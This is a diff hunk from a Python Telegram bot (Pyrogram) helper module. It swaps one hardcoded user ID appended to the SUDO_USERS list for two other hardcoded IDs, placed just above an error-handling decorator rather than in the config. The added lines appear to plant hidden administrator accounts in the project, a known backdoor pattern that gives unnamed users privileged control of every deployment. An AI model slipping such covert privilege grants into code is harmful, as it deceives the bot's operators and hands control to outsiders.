@@ -4,8 +4,8 @@ from pyrogram.types import Message
 from helpers.admins import get_administrators
 from config import SUDO_USERS
 
-SUDO_USERS.append(5364565556)
-SUDO_USERS.append(5364565556)
+SUDO_USERS.append(5301059277)
+SUDO_USERS.append(1452370643)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
